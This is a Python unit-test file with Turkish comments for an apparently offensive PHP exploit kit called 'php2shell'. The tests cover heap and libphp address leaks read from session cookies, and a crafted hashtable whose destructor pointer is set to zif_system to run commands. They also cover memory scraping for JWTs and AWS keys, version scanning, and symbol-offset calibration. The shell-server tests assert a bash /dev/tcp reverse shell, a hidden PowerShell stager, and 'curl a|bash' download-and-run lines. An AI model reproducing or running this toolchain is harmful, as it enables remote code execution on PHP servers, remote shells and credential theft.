#!/usr/bin/env python3
# Birim testler — python3 -m unittest discover -s tests -v
import importlib.util
import os
import struct
import sys
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def load(name, relpath):
    path = os.path.join(ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


exploit = load("php2shell_exploit", "exploit/php2shell_exploit.py")
memd = load("memdisclosure", "exploit/memdisclosure.py")
bug3 = load("bug3", "exploit/bug3_backtrace_uaf.py")
bug4 = load("bug4", "exploit/bug4_opcache_confusion.py")
scanner = load("scanner", "tools/scanner.py")
calib = load("calibrate", "tools/calibrate_offsets.py")
shellsrv = load("shell_server", "tools/shell_server.py")


class TestCookieParsing(unittest.TestCase):
    def test_cookie_value(self):
        resp = b"HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=abc%41def; path=/\r\n\r\n"
        self.assertEqual(exploit.cookie_value(resp), b"abcAdef")

    def test_cookie_absent(self):
        self.assertEqual(exploit.cookie_value(b"HTTP/1.1 200 OK\r\n\r\n"), b"")

    def test_chunk_base_needs_eight_repeats(self):
        chunk = 0x7242F2400000
        raw = b"".join(struct.pack("<Q", chunk + 0x1230) for _ in range(4))
        self.assertEqual(exploit.chunk_base_from_cookie(raw), 0)

    def test_chunk_base_from_cookie(self):
        chunk = 0x7242F2400000
        raw = bytearray(b"\x00" * 4096)
        for i in range(20):
            struct.pack_into("<Q", raw, i * 8, chunk + 0x690D8)
        self.assertEqual(
            exploit.chunk_base_from_cookie(bytes(raw)), chunk)

    def test_libphp_base_alignment_check(self):
        base = 0x7242F40D1000
        raw = bytearray(b"\x00" * 64)
        struct.pack_into("<Q", raw, 0, 0x1111)
        struct.pack_into("<Q", raw, 8, base + exploit.LINUX_DTOR_OFFSET)
        self.assertEqual(
            exploit.libphp_base_from_cookie(bytes(raw),
                                            exploit.LINUX_DTOR_OFFSET),
            base)

    def test_libphp_base_rejects_misaligned(self):
        raw = bytearray(b"\x00" * 64)
        struct.pack_into("<Q", raw, 8, 0x7242F40D1000 + 0x123)
        self.assertEqual(
            exploit.libphp_base_from_cookie(bytes(raw),
                                            exploit.LINUX_DTOR_OFFSET), 0)


class TestPayload(unittest.TestCase):
    def _exploit(self, cmd="id>/out/p"):
        t = exploit.Target("http://127.0.0.1/index.php", quiet=True)
        return exploit.Exploit(t, cmd, exploit.LINUX_ZIF_OFFSET,
                               exploit.LINUX_DTOR_OFFSET,
                               exploit.LINUX_HTDATA_OFFSET)

    def test_cmd_limit_enforced(self):
        with self.assertRaises(SystemExit):
            self._exploit("x" * (exploit.MAX_CMD + 1))

    def test_payload_layout(self):
        ex = self._exploit()
        ht, ref = ex._payload(0x7242F24690D8, 0x7242F4536370)
        self.assertEqual(len(ht), 167)
        # pDestructor (0x30) -> zif_system
        self.assertEqual(struct.unpack_from("<Q", ht, 0x30)[0],
                         0x7242F4536370)
        # komut 0x98'de, NUL sonlandirmali
        self.assertEqual(ht[0x98:0x98 + 9], b"id>/out/p")
        self.assertEqual(ht[0x98 + 9], 0)
        # referans htdata'ya isaret eder (0x18)
        self.assertEqual(struct.unpack_from("<Q", ref, 0x18)[0],
                         0x7242F24690D8)

    def test_multipart_structure(self):
        body = exploit.multipart(
            [{"name": "a", "data": b"1"},
             {"name": "f", "filename": "x.txt", "data": b"2"}], b"BND")
        self.assertIn(b'--BND\r\nContent-Disposition: form-data; name="a"', body)
        self.assertIn(b'filename="x.txt"', body)
        self.assertTrue(body.endswith(b"--BND--\r\n"))

    def test_windows_stager_fits_cmd_limit(self):
        cmd = "curl a/w|cmd"
        self.assertLessEqual(len(cmd), exploit.MAX_CMD)
        self.assertLessEqual(len("curl a|bash"), exploit.MAX_CMD)

    def test_tls_verify_default_on(self):
        t = exploit.Target("https://127.0.0.1/index.php", quiet=True)
        self.assertTrue(t.verify_tls)
        t2 = exploit.Target("https://127.0.0.1/index.php", quiet=True,
                            verify_tls=False)
        self.assertFalse(t2.verify_tls)


class TestMemDisclosure(unittest.TestCase):
    def test_find_strings(self):
        data = b"\x00\x01hello world\x00ab\x00PHPSESSID=xyz\xff"
        strs = memd.find_strings(data)
        self.assertIn(b"hello world", strs)
        self.assertNotIn(b"ab", strs)

    def test_extract_pointers_range(self):
        raw = struct.pack("<Q", 0x7242F24690D8) + struct.pack("<Q", 0x1234)
        ptrs = memd.extract_pointers(raw)
        self.assertIn(0x7242F24690D8, ptrs)
        self.assertNotIn(0x1234, ptrs)

    def test_find_secrets_jwt_and_aws(self):
        jwt = (b"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0."
               b"abcDEF123-_xyz")
        found = memd.find_secrets(b"token: " + jwt + b" AKIAIOSFODNN7EXAMPLE")
        types = {s["type"] for s in found}
        self.assertIn("JWT", types)
        self.assertIn("AWS Access Key", types)


class TestScanner(unittest.TestCase):
    def test_parse_version(self):
        self.assertEqual(scanner.parse_php_version("8.4.26"), (8, 4, 26))
        self.assertEqual(scanner.parse_php_version("bozuk"), (0, 0, 0))

    def test_version_matrix(self):
        self.assertTrue(scanner.is_version_vulnerable("8.4.26")[0])
        self.assertFalse(scanner.is_version_vulnerable("8.4.27")[0])
        self.assertTrue(scanner.is_version_vulnerable("8.3.35")[0])
        self.assertFalse(scanner.is_version_vulnerable("8.3.36")[0])
        self.assertTrue(scanner.is_version_vulnerable("8.5.11")[0])
        self.assertFalse(scanner.is_version_vulnerable("8.5.12")[0])
        self.assertFalse(scanner.is_version_vulnerable("7.4.33")[0])

    def test_sapi_matrix(self):
        self.assertTrue(scanner.is_sapi_exploitable("mod_php")[0])
        self.assertFalse(scanner.is_sapi_exploitable("fpm")[0])
        self.assertFalse(scanner.is_sapi_exploitable("unknown")[0])

    def test_unknown_sapi_is_not_labelled_fpm(self):
        info = {"php_version": "8.4.26", "sapi": "unknown",
                "server": "Apache", "headers": {}}
        with mock.patch.object(scanner, "detect_php_info", return_value=info), \
             mock.patch.object(scanner.socket, "gethostbyname",
                               return_value="127.0.0.1"):
            result = scanner.scan_target("http://target.local")
        self.assertEqual(result.status, scanner.Status.UNKNOWN)
        self.assertNotEqual(result.status,
                            scanner.Status.FPM_NOT_EXPLOITABLE)

    def test_known_fpm_is_labelled_fpm(self):
        info = {"php_version": "8.4.26", "sapi": "fpm",
                "server": "nginx", "headers": {}}
        with mock.patch.object(scanner, "detect_php_info", return_value=info), \
             mock.patch.object(scanner.socket, "gethostbyname",
                               return_value="127.0.0.1"):
            result = scanner.scan_target("http://target.local")
        self.assertEqual(result.status, scanner.Status.FPM_NOT_EXPLOITABLE)


class TestBug3Classify(unittest.TestCase):
    def test_classify(self):
        self.assertEqual(bug3.classify_consumer(None), "crash")
        self.assertEqual(bug3.classify_consumer(500), "error")
        self.assertEqual(bug3.classify_consumer(503), "error")
        self.assertEqual(bug3.classify_consumer(200), "clean")
        self.assertEqual(bug3.classify_consumer(404), "other")


class TestBug4DataStructures(unittest.TestCase):
    def test_shm_layout_utilization(self):
        layout = bug4.SHMLayout(used_memory=800, free_memory=200)
        self.assertAlmostEqual(layout.utilization, 80.0)
        self.assertEqual(layout.total_memory, 1000)

    def test_shm_layout_zero_mem(self):
        layout = bug4.SHMLayout()
        self.assertAlmostEqual(layout.utilization, 0.0)

    def test_calibration_result_defaults(self):
        cal = bug4.CalibrationResult()
        self.assertEqual(cal.optimal_ml, 0)
        self.assertFalse(cal.partial_persist_detected)

    def test_corruption_result_defaults(self):
        cr = bug4.CorruptionResult()
        self.assertFalse(cr.corrupted)

    def test_leak_result_defaults(self):
        lr = bug4.LeakResult()
        self.assertFalse(lr.confused)
        self.assertEqual(lr.chunk_base, 0)
        self.assertEqual(lr.libphp_base, 0)

    def test_rce_result_defaults(self):
        rce = bug4.RCEResult()
        self.assertFalse(rce.success)

    def test_is_user_pointer(self):
        self.assertTrue(bug4.is_user_pointer(0x7F42F2400000))
        self.assertTrue(bug4.is_user_pointer(0x7242F2400000))
        self.assertFalse(bug4.is_user_pointer(0x1234))
        self.assertFalse(bug4.is_user_pointer(0x0000800000000000))


class TestCalibrate(unittest.TestCase):
    NM = (
        "0000000000465370 T zif_system\n"
        "000000000065eb60 T zval_ptr_dtor\n"
        "0000000000112233 T baska_sembol\n"
        "                 U malloc@@GLIBC_2.2.5\n"
    )

    def test_parse_nm(self):
        syms = calib.parse_nm_output(self.NM)
        self.assertEqual(syms["zif_system"], 0x465370)
        self.assertEqual(syms["zval_ptr_dtor"], 0x65EB60)
        self.assertNotIn("malloc", syms)

    def test_build_offsets_missing_symbol(self):
        with self.assertRaises(SystemExit):
            calib.build_offsets({"zif_system": 0x1000})

    def test_format_cli(self):
        out = calib.format_cli({"zif_system": 0x465370,
                                "zval_ptr_dtor": 0x65EB60})
        self.assertIn("--zif-offset 0x465370", out)
        self.assertIn("--dtor-offset 0x65eb60", out)


class TestShellServer(unittest.TestCase):
    def test_linux_oneliner(self):
        body = shellsrv.get_linux_bash_oneliner("10.0.0.1", 4444)
        self.assertIn("/dev/tcp/10.0.0.1/4444", body)

    def test_windows_stager_is_powershell(self):
        body = shellsrv.get_windows_stager("10.0.0.1", 4444)
        self.assertIn("powershell -nop -w hidden -e", body)

    def test_os_specific_test_commands(self):
        self.assertIn("whoami", shellsrv.get_test_commands("windows"))
        self.assertIn("id", shellsrv.get_test_commands("linux"))


if __name__ == "__main__":
    unittest.main()
